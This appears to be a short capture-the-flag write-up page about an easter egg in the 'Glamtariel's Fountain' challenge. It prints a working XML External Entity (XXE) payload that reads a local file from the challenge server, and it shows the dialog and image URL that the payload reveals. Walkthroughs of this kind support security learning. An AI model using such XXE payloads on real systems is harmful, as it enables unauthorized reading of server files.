# Ram Bambidil

After retrieving the ring list during the <a href="../../quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/">Glamtariel's Fountain</a> objective, if we give the Princess the Green Ring via the XXE method, we get an interesting dialog.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/greenring.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| greenring.txt| princess | Hey, who is this guy? He doesn't have a ticket! | I don't remember seeing him in the movies! |

We also have a new value in the 'visit' property, telling us to go to `https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png`, where we get the following image.

![](tomb2022-tommyeasteregg3847516894.png)